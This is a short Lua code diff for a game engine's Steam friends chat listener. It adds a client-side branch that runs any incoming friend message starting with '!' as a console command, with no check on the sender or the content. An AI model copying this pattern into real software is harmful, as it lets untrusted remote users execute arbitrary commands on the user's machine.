@@ -1,5 +1,3 @@
-include("autorun/server/chat_commands.lua")
-
 local subject
 
 event.AddListener("SteamFriendsMessage", "steam_friends", function(sender_steam_id, txt, receiver_steam_id)
@@ -15,7 +13,11 @@ event.AddListener("SteamFriendsMessage", "steam_friends", function(sender_steam_
 	timer.Delay(0.1, function() subject = nil end)
 	
 	if ply:IsValid() then
-		chat.PlayerSay(ply, txt)
+		if SERVER then
+			chat.PlayerSay(ply, txt)
+		elseif txt:sub(1, 1) == "!" then
+			console.RunString(txt:sub(2))
+		end
 	end
 end)
 
